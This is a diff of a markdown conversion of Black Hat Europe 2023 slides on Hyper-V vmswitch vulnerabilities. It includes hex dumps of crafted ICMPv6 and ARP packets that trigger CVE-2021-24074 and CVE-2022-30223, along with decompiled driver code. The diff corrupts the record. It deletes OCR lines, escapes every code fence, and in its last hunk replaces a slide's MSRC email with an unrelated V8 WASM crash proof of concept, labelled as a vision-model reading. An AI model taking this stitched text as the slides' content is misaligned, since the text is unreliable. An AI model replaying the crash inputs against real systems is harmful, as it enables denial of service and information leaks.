@@ -8,18 +8,25 @@ year: 2023
 source_pdf: "Black Hat Europe 2023 slides/Qian Chen, A Ben, Ruiqi Chen, Hang An, Luo Quan_Breaking Theoretical Limits The Gap Between Virtual NICs and Physical Network Cards.pdf"
 pages: 45
 sha256: "121eddb76cfbfb30f2c705ff84aecbd1c48fdaa6e52fcb7971187b32a821df72"
-text_chars: 25153
+text_chars: 23810
 ocr_pages: 8
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 89.0
+ocr_unreliable_blocks: 1
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:13:01Z"
+converted_at: "2026-08-12T04:04:19Z"
 ---
 # Breaking Theoretical Limits The Gap Between Virtual NICs and Physical Network Cards
 
 **Speakers:** Qian Chen, A Ben, Ruiqi Chen, Hang An, Luo Quan  
 **Conference:** Black Hat Europe 2023  
 **Source:** `Black Hat Europe 2023 slides/Qian Chen, A Ben, Ruiqi Chen, Hang An, Luo Quan_Breaking Theoretical Limits The Gap Between Virtual NICs and Physical Network Cards.pdf` (45 pages)
+
 
 ## Slide 1
 
@@ -213,514 +220,95 @@ reverse engineering the vmswitch module
 
 A single ICMPv6 packet whose length is bigger than 65535
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 83/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-No.
-Time
-2 69.159055
-3 69.159055
-4 74.177271
-5 74.177271
-Source
-fe8e: :db90:748e: FcSf: e62F
-fe8e: :db90:748e: fc5f: e62F
-fes8e@: :db90:748e: fc5f: e62F
-fe8e: :db90:748e: fc5f:e62F
-Destination
-fe8@: :acc6:5128:792d:5005
-fe8@: :acc6:5128:792d:50e5
-fe8@: :acc6:5128:792d:5005
-fe8@: :acc6:5128:792d:50e5
-Protocol
-ICMPv6
-ICMPv6
-ICMPv6
-ICMPv6
-69741
-69741
-Info
-Unknown
-Unknown
-69741 Unknown
-69741 Unknown
-(86)
-(86)
-(86)
-(86)
-> Frame 2: 69741 bytes on wire (557928 bits), 69741 bytes captured (557928 bits) on interfac
-> Ethernet II, Src: Microsof_be:bc:0@ (@0:15:5d:be:bc:00), Dst: VMware _3e:02:d1 (00:0c:29: 3¢
-v
-vvvvvvVv vv vv VY
-Q110 ....
-= Version: 6
-«++. 0000 0000 ....
-+++. 0000 9000 9202 E000 GE00 = Flow Label: exe0000
-Payload Length: @ (Jumbogram)
-Next Header: IPv6 Hop-by-Hop Option (@)
-Hop Limit: 255
-Source Address:
-Destination Address: fe8@::acc6:5128:792d:5005
-fe8e: :db90:748e: FcSf: e62F
-IPv6 Hop-by-Hop Option
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Header
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-Routing
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-IPv6
-TPv6
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(Unknown
-(inknown
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-86)
-RB)
-type
-type
-type
-type
-type
-type
-type
-type
-type
-type
-type
-type
-type
-type
-tvne
-= Traffic Class: @x@@ (DSCP: CS@, ECN: Not-ECT)
-00000000
-08000010
-80000020
-88000030
-80000040
-80000050
-80080060
-Qee0000be
-eeeeeece
-eeeeeede
-ge0e00e0
-eeeeeefe
-00000100
-ee@0ee110
-@e000120
-900001720
-90000180
-@0000190
-000001a0
-00e0001be
-e0e001ca
-eeee0e1de
-J)
-J)
-74
-51
-ee
-Q2
-la
-2a
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-Oc
-J)
-8e
-28
-ee
-ee
-1b
-2b
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-29
-eo
-fc
-79
-@6
-ee
-1c
-2c
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-3e
-J)
-Sf
-2d
-d5
-ee
-1d
-2d
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-5p
-@2
-ee
-e6
-58
-ee
-ee
-te
-2e
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-da
-ff
-af
-@5
-15
-ee
-af
-2f
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-ee
-fe
-fe
-2b
-@c
-10
-20
-30
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-15
-80
-80
-eo
-ba
-11
-21
-31
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-5d
-ee
-eo
-c2
-73
-12
-22
-32
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-be
-ee
-eo
-@4
-60
-13
-23
-33
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-56
-bc
-eo
-eo
-eo
-eo
-14
-24
-34
-56
-56
-56
-(J2)
-Je)
-(Je)
-e1
-ee
-15
-25
-35
-56
-56
-56
-56
-56
-56
-56
-86
-Ja)
-00
-10
-ee
-16
-26
-36
-56
-56
-56
-56
-56
-56
-56
-dd
-00
-00
-18
-0e
-17
-27
-37
-56
-56
-56
-56
-56
-60
-db
-ac
-2b
-56
-18
-28
-56
-56
-56
-56
-56
-56
-2)
-98
-cé
-ff
-ff
-19
-29
-56
-56
-56
-56
-56
-56
-56
-56
+[Wireshark packet list]
+No.   Time        Source                       Destination                  Protocol   Length   Info
+2     69.159055   fe80::db90:748e:fc5f:e62f    fe80::acc6:5128:792d:5005    ICMPv6     69741    Unknown (86)
+3     69.159055   fe80::db90:748e:fc5f:e62f    fe80::acc6:5128:792d:5005    ICMPv6     69741    Unknown (86)
+4     74.177271   fe80::db90:748e:fc5f:e62f    fe80::acc6:5128:792d:5005    ICMPv6     69741    Unknown (86)
+5     74.177271   fe80::db90:748e:fc5f:e62f    fe80::acc6:5128:792d:5005    ICMPv6     69741    Unknown (86)
+
+[Packet details pane]
+> Frame 2: 69741 bytes on wire (557928 bits), 69741 bytes captured (557928 bits) on interfac[cut off by hex pane]
+> Ethernet II, Src: Microsof_be:bc:00 (00:15:5d:be:bc:00), Dst: VMware_3e:02:d1 (00:0c:29:3e[cut off by hex pane]
+v Internet Protocol Version 6, Src: fe80::db90:748e:fc5f:e62f, Dst: fe80::acc6:5128:792d:500[cut off by hex pane]
+      0110 .... = Version: 6
+    > .... 0000 0000 .... .... .... .... .... = Traffic Class: 0x00 (DSCP: CS0, ECN: Not-ECT)
+      .... 0000 0000 0000 0000 0000 = Flow Label: 0x00000
+      Payload Length: 0 (Jumbogram)
+      Next Header: IPv6 Hop-by-Hop Option (0)
+      Hop Limit: 255
+      Source Address: fe80::db90:748e:fc5f:e62f
+      Destination Address: fe80::acc6:5128:792d:5005
+> IPv6 Hop-by-Hop Option
+> Routing Header for IPv6 (Source Route)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)
+> Routing Header for IPv6 (Unknown type 86)   [dimmed behind caption bar]
+> Routing Header for IPv6 (Unknown type 86)   [dimmed behind caption bar, bottom row clipped]
+
+[Hex pane - ASCII column cut off at the right slide edge]
+00000000  00 0c 29 3e 02 d1 00 15  5d be bc 00 86 dd 60 00
+00000010  00 00 00 00 00 ff fe 80  00 00 00 00 00 00 db 90
+00000020  74 8e fc 5f e6 2f fe 80  00 00 00 00 00 00 ac c6
+00000030  51 28 79 2d 50 05 2b 00  c2 04 00 01 10 10 2b ff
+00000040  00 00 06 d5 00 15 0c ba  73 60 00 00 00 00 56 ff
+00000050  02 00 00 00 00 00 10 11  12 13 14 15 16 17 18 19
+00000060  1a 1b 1c 1d 1e 1f 20 21  22 23 24 25 26 27 28 29
+00000070  2a 2b 2c 2d 2e 2f 30 31  32 33 34 35 36 37 56 56
+00000080  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000090  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000000a0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000000b0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000000c0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000000d0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000000e0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000000f0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000100  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000110  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000120  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000130  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000140  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000150  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000160  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000170  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000180  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+00000190  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000001a0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000001b0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000001c0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000001d0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56
+000001e0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56   [dimmed behind caption bar]
+000001f0  56 56 56 56 56 56 56 56  56 56 56 56 56 56 56 56   [dimmed behind caption bar]
+
+A single ICMPv6 packet whose length is bigger than 65535
 ```
 
 ## Slide 13
 
 A single ARP packet whose length is only 15 (extra padding added by OS)
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 No. Time Source
-23 0.168495 Microsof_be:bc:0e
-24 0.168520 Microsof_be:bc:0@0
-25 0.168545 Microsof_be:bc:00
 26 @.252788 Microsof_be:bc:00
 27 @.252925 Microsof_be:bc:00
 Destination
@@ -742,18 +330,13 @@ Length Info
 34 Reserved opcode
 34 Reserved opcode
 Frame 23: 34 bytes on wire (272 bits), 34 bytes captured (272 bits) on interface \Device\NPF
-v Ethernet II, Src: Microsof_be:bc:00@ (00:15:5d:be:bc:00), Dst: Broadcast (ff: ff: ff: ff: ff: fF)
-Destination: Broadcast (ff: ff: ff: ff: ff: fF)
-Source: Microsof_be:bc:00 (00:15:5d:be:bc:@0)
 Type: ARP (@x@806)
-Trailer: e9eeeeQ9eeQeeQe0000000000
 v Address Resolution Protocol (reserved)
 Hardware type: Unknown (24576)
 Protocol type: Unknown (0x9e0e)
 Hardware size: @
 Protocol size: @
 Opcode: reserved (@)
-88 ee
 ```
 
 ## Slide 14
@@ -956,52 +539,52 @@ NIC
 
 ## vmswitch Stacking Behavior
 
-```
+\```
 // ...
-```
+\```
 
-```
+\```
 RtlInitUnicodeString(&DestinationString, L"VMSP");
 ProtocolCharacteristics.Header=8389269;
 // ...
-```
+\```
 
-```
+\```
 ProtocolCharacteristics.OpenAdapterCompleteHandlerEx=VmsPtNicOpenAdapterCompleteEx;
 ProtocolCharacteristics.CloseAdapterCompleteHandlerEx=VmsPtNicCloseAdapterCompleteEx;
 // ...
-```
+\```
 
-```
+\```
 ProtocolCharacteristics.UninstallHandler=VmsPtNicUninstall;
-```
+\```
 
-```
+\```
 v12 =NdisRegisterProtocolDriver(0i64, &ProtocolCharacteristics, &VmsProtocolHandle);
 /* ... */
-```
+\```
 
-```
+\```
 RtlInitUnicodeString(&v35, L"Hyper-V Virtual Switch Extension Filter");
 RtlInitUnicodeString(&v36, L"{529B8983-9625-49A5-8284-CE944FD8E242}");
 RtlInitUnicodeString(&v37, L"VMSVSF");
-```
+\```
 
-```
+\```
 FilterDriverCharacteristics.SetOptionsHandler=VmsExtFilterSetFilterModuleOptions;
 FilterDriverCharacteristics.SetFilterModuleOptionsHandler=VmsExtFilterSetFilterModuleOptions;
 // ...
-```
+\```
 
-```
+\```
 FilterDriverCharacteristics.SendNetBufferListsHandler=VmsExtFilterSendNetBufferLists;
 // ...
-```
+\```
 
-```
+\```
 v18 =NdisFRegisterFilterDriver(DriverObject, 0i64, &FilterDriverCharacteristics,
 &VmsVswitchFilterHandle);
-```
+\```
 
 ## Slide 24
 
@@ -1052,7 +635,8 @@ Caused by a single ICMPv6 packet whose length is bigger than 65535
 
 CVE-2021-24074 Integer Overflow
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2021-24074 Integer Overflow
@@ -1061,7 +645,6 @@ CVE-2021-24074
 Security Vulnerability
 Released: Feb 9, 2021
 Assigning CNA: Microsoft
-CVE-2021-24074
 CVSS:3.19.8/8.5 ©
 Exploitability
 The following table provides an exploitability assessment for this vulnerability at the time of original publication.
@@ -1072,7 +655,8 @@ Publicly disclosed Exploited Exploitability assessment
 
 CVE-2021-24074 Integer Overflow
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2021-24074 Integer Overflow
@@ -1083,7 +667,6 @@ Frame 148: 86 bytes on wire (688 bits), 86 bytes captured (688 bits) @0 Oc 29 75
 Ethernet II, Src: VMware_86:75:3b (00:0c:29:86:75:3b), Dst: VMware f8:8d:f3 (00:0c:29:f8:8 228 80 2 @2 08 828 00 98
 v Internet Protocol Version 6, Src: fe80::98c3:5e9d:e2db:9090, Dst: fesda::20c:29ff:fefs:8df3\| 9220 Se 9d e2 88 88 028 20 G2
 0000 0000 .... .... wees seve sees = Traffic Class: @x0@ (DSCP: CSQ, ECN: Not-ECT) 00 00 00 e2 db 98 90 @2
-Q008@ e208 eee eeee@ EGE@ = Flow Label: exeeeee @ @c 29
 Payload Length: 32
 Next Header: ICMPv6 (58)
 Hop Limit: 255
@@ -1119,32 +702,32 @@ call stack
 
 ## Slide 30
 
-```
+\```
 VOID Ipv6pHandleRouterAdvertisement(ICMPV6_MESSAGE *Icmpv6, IP_REQUEST_CONTROL_DATA *Args) {
 // ...
-```
+\```
 
-```
+\```
 USHORT ParsedLength;// (1)
 /* ... Validate the Router Advertisement ... */
 /* ... Get the Router Advertisement header ... */
-```
+\```
 
-```
+\```
 Advertisement =NetioGetDataBuffer(NetBuffer, sizeof(ND_ROUTER_ADVERT_HEADER), &AdvertisementBuffer, 1, 0);
 ParsedLength=sizeof(ND_ROUTER_ADVERT_HEADER);
-```
+\```
 
-```
+\```
 /* ... */
-```
+\```
 
-```
+\```
 while (Ipv6pParseTlvOption(NetBuffer, &Type, &Length)) { // (2)sanity-check the options
 switch(Type) {
-```
+\```
 
-```
+\```
 caseND_OPT_SOURCE_LINKADDR:// ...
 caseND_OPT_MTU:// ...
 caseND_OPT_PREFIX_INFORMATION:// ...
@@ -1156,12 +739,12 @@ NetioAdvanceNetBuffer(NetBuffer, Length); // (3)
 ParsedLength+= Length;   // (4)
 }
 // ...
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer(NetBuffer, ParsedLength, 0);   // (5)
 // ...
-```
+\```
 
 ... Option1 Option2 Option5
 
@@ -1169,29 +752,29 @@ ICMPv6 Options
 
 ## Slide 31
 
-```
+\```
 VOID Ipv6pHandleRouterAdvertisement(ICMPV6_MESSAGE *Icmpv6, IP_REQUEST_CONTROL_DATA *Args) {
 // ...
-```
+\```
 
-```
+\```
 USHORT ParsedLength;// (1)
 /* ... Validate the Router Advertisement ... */
 /* ... Get the Router Advertisement header ... */
-```
+\```
 
-```
+\```
 Advertisement =NetioGetDataBuffer(NetBuffer, sizeof(ND_ROUTER_ADVERT_HEADER), &AdvertisementBuffer, 1, 0);
 ParsedLength=sizeof(ND_ROUTER_ADVERT_HEADER);
-```
+\```
 
-```
+\```
 /* ... */
 while (Ipv6pParseTlvOption(NetBuffer, &Type, &Length)) { // (2)sanity-check the options
 switch(Type) {
-```
+\```
 
-```
+\```
 caseND_OPT_SOURCE_LINKADDR:// ...
 caseND_OPT_MTU:// ...
 caseND_OPT_PREFIX_INFORMATION:// ...
@@ -1203,12 +786,12 @@ NetioAdvanceNetBuffer(NetBuffer, Length); // (3)
 ParsedLength+= Length;   // (4)
 }
 // ...
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer(NetBuffer, ParsedLength, 0);   // (5)
 // ...
-```
+\```
 
 ... Option1 Option2 Option5
 
@@ -1216,32 +799,32 @@ ICMPv6 Options
 
 ## Slide 32
 
-```
+\```
 VOID Ipv6pHandleRouterAdvertisement(ICMPV6_MESSAGE *Icmpv6, IP_REQUEST_CONTROL_DATA *Args) {
 // ...
-```
+\```
 
-```
+\```
 USHORT ParsedLength;// (1)
 /* ... Validate the Router Advertisement ... */
 /* ... Get the Router Advertisement header ... */
-```
+\```
 
-```
+\```
 Advertisement =NetioGetDataBuffer(NetBuffer, sizeof(ND_ROUTER_ADVERT_HEADER), &AdvertisementBuffer, 1, 0);
 ParsedLength=sizeof(ND_ROUTER_ADVERT_HEADER);
-```
+\```
 
-```
+\```
 /* ... */
-```
+\```
 
-```
+\```
 while (Ipv6pParseTlvOption(NetBuffer, &Type, &Length)) { // (2)sanity-check the options
 switch(Type) {
-```
+\```
 
-```
+\```
 caseND_OPT_SOURCE_LINKADDR:// ...
 caseND_OPT_MTU:// ...
 caseND_OPT_PREFIX_INFORMATION:// ...
@@ -1253,12 +836,12 @@ NetioAdvanceNetBuffer(NetBuffer, Length); // (3)
 ParsedLength+= Length;   // (4)
 }
 // ...
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer(NetBuffer, ParsedLength, 0);   // (5)
 // ...
-```
+\```
 
 ... Option1 Option2 Option5
 
@@ -1266,58 +849,58 @@ ICMPv6 Options
 
 ## Slide 33
 
-```
+\```
 VOID Ipv6pHandleRouterAdvertisement(ICMPV6_MESSAGE *Icmpv6, IP_REQUEST_CONTROL_DATA *Args) {
 // ...
-```
+\```
 
-```
+\```
 USHORT ParsedLength;// (1)
 /* ... Validate the Router Advertisement ... */
 /* ... Get the Router Advertisement header ... */
-```
+\```
 
-```
+\```
 Advertisement =NetioGetDataBuffer(NetBuffer, sizeof(ND_ROUTER_ADVERT_HEADER), &AdvertisementBuffer, 1, 0);
 ParsedLength=sizeof(ND_ROUTER_ADVERT_HEADER);
-```
+\```
 
-```
+\```
 /* ... */
-```
+\```
 
-```
+\```
 while (Ipv6pParseTlvOption(NetBuffer, &Type, &Length)) { // (2)sanity-check the options
 switch(Type) {
-```
+\```
 
-```
+\```
 caseND_OPT_SOURCE_LINKADDR:// ...
 caseND_OPT_MTU:// ...
 caseND_OPT_PREFIX_INFORMATION:// ...
 caseND_OPT_ROUTE_INFO:// ...
-```
+\```
 
-```
+\```
 }
 // Move forward to the next option.
-```
+\```
 
-```
+\```
 // Keep track of the parsed length, so we can use it below to back up.
 NetioAdvanceNetBuffer(NetBuffer, Length); // (3)
 ParsedLength+= Length;   // (4)
 }
 // ...
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer(NetBuffer, ParsedLength, 0);   // (5)
-```
+\```
 
-```
+\```
 // ...
-```
+\```
 
 ... Option1 Option2 Option5
 
@@ -1325,67 +908,67 @@ ICMPv6 Options
 
 ## Slide 34
 
-```
+\```
 VOID Ipv6pHandleRouterAdvertisement(ICMPV6_MESSAGE *Icmpv6, IP_REQUEST_CONTROL_DATA *Args) {
 // ...
-```
+\```
 
-```
+\```
 USHORT ParsedLength;// (1)
 /* ... Validate the Router Advertisement ... */
 /* ... Get the Router Advertisement header ... */
-```
+\```
 
-```
+\```
 Advertisement =NetioGetDataBuffer(NetBuffer, sizeof(ND_ROUTER_ADVERT_HEADER), &AdvertisementBuffer, 1, 0);
 ParsedLength=sizeof(ND_ROUTER_ADVERT_HEADER);
-```
+\```
 
-```
+\```
 /* ... */
-```
+\```
 
-```
+\```
 while (Ipv6pParseTlvOption(NetBuffer, &Type, &Length)) { // (2)sanity-check the options
 switch(Type) {
-```
+\```
 
-```
+\```
 caseND_OPT_SOURCE_LINKADDR:// ...
 caseND_OPT_MTU:// ...
 caseND_OPT_PREFIX_INFORMATION:// ...
 caseND_OPT_ROUTE_INFO:// ...
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 // Move forward to the next option.
-```
+\```
 
-```
+\```
 // Keep track of the parsed length, so we can use it below to back up.
 NetioAdvanceNetBuffer(NetBuffer, Length); // (3)
-```
+\```
 
-```
+\```
 ParsedLength+= Length;   // (4) integer overflow
 }
-```
+\```
 
-```
+\```
 // ...
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer(NetBuffer, ParsedLength, 0);   // (5)
-```
+\```
 
-```
+\```
 // ...
-```
+\```
 
 ... Option1 Option2 Option5
 
@@ -1397,7 +980,8 @@ Caused by a single ARP packet whose length is only 15
 
 CVE-2022-30223 Out-of-bounds Read
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2022-30223 Out-of-bounds Read
@@ -1418,7 +1002,8 @@ Publicly disclosed Exploited Exploitability assessment
 
 CVE-2022-30223 Out-of-bounds Read
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2022-30223 Out-of-bounds Read
@@ -1445,7 +1030,7 @@ Target IP address: 192.168.63.2
 
 ## CVE-2022-30223
 
-```
+\```
 vmswitch!VmsNblHelperCreateCloneNbl
 vmswitch!VmsMpNicPvtPacketForward+0x308
 vmswitch!VmsRouterDeliverNetBufferLists+0x81a
@@ -1456,7 +1041,7 @@ NDIS!ndisCallReceiveHandler+0x47
 NDIS!NdisMIndicateReceiveNetBufferLists+0x735
 vmswitch!VmsExtMpIndicatePackets+0xa55
 vmswitch!VmsExtMpSendNetBufferLists+0x5a8
-```
+\```
 
 ### Out-of-bounds Read
 
@@ -1464,13 +1049,13 @@ call stack
 
 ## Slide 38
 
-```
+\```
 __int64VmsNblHelperCreateCloneNbl(PNET_BUFFER_LISTSrcNetBufferList, NDIS_HANDLENetBufferListPoolHandle, NDIS_HANDLE
 NetBufferPoolHandle, chara4, chara5, chara6, inta7, __int64a8) {
 // ...
-```
+\```
 
-```
+\```
 v11 =v10_SrcNetBufferList->NetBufferListInfo[0];
 if( v11 &&((unsigned__int8)v11 &0x1C) !=0) {
 // ...
@@ -1495,12 +1080,12 @@ v21 = v12;   // (2)
 /* ... */
 while( 1) {
 // ...
-```
+\```
 
-```
+\```
 v19_dstNetBufferList = NdisCopyFromNetBufferToNetBuffer(v26, 0, v21, v24, 0, &BytesCopied); // (3)
 // ...
-```
+\```
 
 ## Slide 39
 
@@ -1509,7 +1094,8 @@ A 15 byte ARP packet is expanded to 34 bytes, resulting in kernel address leakag
 
 CVE-2022-30223 Out-of-bounds Read
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CVE-2022-30223
@@ -1519,7 +1105,6 @@ Tine Source Destination Protocol
 Frame 2: 34 bytes on wire (272 bits), 34 bytes captured (272 bits) on interface \Dev
 v Ethernet II, Src: Microsof_be:bc:00 (@0:15:5d:be:bc:00), Dst: Broadcast (ff:ff: ff: ff
 Destination: Broadcast (ff:ff: ff: ff: fF: fF)
-Source: Microsof_be:bc:00 (@0:15:5d:be:bc:@@)
 Type: ARP (@x@806)
 v Address Resolution Protocol (opcode @x@10@)
 Hardware type: Unknown (24576)
@@ -1527,7 +1112,6 @@ Protocol type: Unknown (@x@@e0)
 Hardware size: 6
 Protocol size: @
 Opcode: Unknown (256)
-Candan handuann addrnnces anaanorc7A0A
 Out-of-bounds Read
 Length Info
 34 Reserved opcode @
@@ -1543,26 +1127,88 @@ NULL pointer deference caused by a packet with only 8-byte IP header
 
 ## Slide 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-RE: Re: Microsoft Bounty Program: Out-of-Scope Notification Case 71449 CRM:0022001410
-Microsoft Security Response Center
-MSFT Bounty<bount crosoft.com a4651386@163.com<a4651 386
-Microsoft Security Response Center I Microsoft Security Response Center
-Microsoft Security Response Center<se
-01:37
-Hello Quan,
-I'm sorry for the frustration in MSRC's outcome of this case. Since your test environment is using VMWare and ours is using Hyper-V, might we suggest we
-align our testing environments? To that end might we suggest that you create a new POC using only Microsoft Hyper-V and submit that POC as a new case
-submission. That would allow us to rotate the assessment engineer to a fresh set of eyes.
-Thank you again for working with MSRC.
-Regards,
-Duncan
-Microsoft Security... ~ — RE: Re: Microsoft Bounty Program: Out-of-Scope Notification Case 7144...
-MSFT Bounty ~ RE: Microsoft Bounty Program: Out-of-Scope Notification Case 71449 CR...
-Microsoft Security... ~ RE: MSRC Case 71449 CRM:0022001410
-Microsoft Security... ~ MSRC Case 71449 CRM:0022001410
+How to modify the Fuzzer to find bugs?
+
+Export WASM Struct to JS
+
+...
+function createWasmStruct() {
+let builder = new WasmModuleBuilder();
+let struct_type = builder.addStruct([...]);
+builder.addFunction('makeStruct', ...)
+.exportFunc()
+.addBody([
+kExprI32Const, 42,
+kGCPrefix, kExprStructNew, struct_type,
+kGCPrefix, kExprExternConvertAny
+]);
+let instance = builder.instantiate();
+return instance.exports.makeStruct();
+}
+let struct = createWasmStruct();
+
+// original-sample.js    Original JS Sample
+// A regular JS object
+let normalProto = {};
+// Change Array's prototype to normalProto
+Array.prototype.__proto__ = normalProto;
+// Perform a concat operation on an array
+print([1].concat());
+
+Mutation
+
+Mutated Attack Code
+
+...
+function createWasmStruct() {
+let builder = new WasmModuleBuilder();
+let struct_type = builder.addStruct([...]);
+builder.addFunction('makeStruct', ...)
+.exportFunc()
+.addBody([
+kExprI32Const, 42,
+kGCPrefix, kExprStructNew, struct_type,
+kGCPrefix, kExprExternConvertAny
+]);
+let instance = builder.instantiate();
+return instance.exports.makeStruct();
+}
+// Replace normalProto with a WASM struct
+let wasmObj = createWasmStruct();
+Array.prototype.__proto__ = wasmObj;
+print([1].concat());
+
+Key Mutation Points:
+- Replace JS object with WASM struct
+- Pollute Array prototype chain
+- Triggers concat() method
+
+Boom!
+
+$ /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc.js
+
+#
+# Fatal error in gen/torque-generated/src/objects/js-objects-tq-inl.inc, line 67
+# Check failed: !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSObject_NonInline(*this)).
+#
+#
+#
+#FailureMessage Object: 0x7ffd386ecee0
+==== C stack trace ===============================
+
+    /tmp/d8-linux-debug-v8-component-93712/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+[clipped]
+    /tmp/d8-linux-debug-v8-component-93712/libv8_libplatform.so(+0x18e0d) [0x7ff684218e0d]
+    /tmp/d8-linux-debug-v8-component-93712/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ..[clipped]
+    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x25721f2) [0x7ff6813721f2]
+    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x2660ffc) [0x7ff681460ffc]
+    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x26589d3) [0x7ff6814589d3]
+    /tmp/d8-linux-debug-v8-component-93712/libv8.so(v8::internal::Builtin_ArrayConcat(int, unsigned lo[clipped]
+    /tmp/d8-linux-debug-v8-component-93712/libv8.so(+0x1d7bb7d) [0x7ff680b7bb7d]
